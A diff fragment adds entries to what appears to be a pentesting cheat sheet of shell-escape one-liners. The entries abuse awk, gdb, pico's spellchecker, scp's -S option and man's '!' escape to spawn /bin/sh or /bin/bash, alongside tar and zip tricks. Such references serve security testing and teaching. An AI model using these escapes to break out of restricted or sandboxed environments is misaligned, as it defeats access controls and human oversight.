@@ -16,4 +16,22 @@ $ tar -cf archive.tar *
 $ touch a
 $ zip z.zip a -T -TT ./shell.sh
 
-[5]
+[5] awk command shell
+$ awk 'BEGIN {system("/bin/sh")}'
+
+[6] gdb command shell
+> shell /bin/bash
+
+[7] pico command shell
+$ pico -s ./shell.sh random_file
+# Write random string and press ctrl+t to invoke spellchecker. You have to write something for this to work.
+
+[8] scp command shell
+$ scp -S ./shell.sh 127.0.0.1:./ 127.0.0.1:/b
+# scp has different behaviour when there is no IP adress so be careful with proper command format.
+# For example scp -S ./shell.sh ./ /b will not work properly
+
+[9] man command shell
+$ man man
+> !'/bin/bash'
+
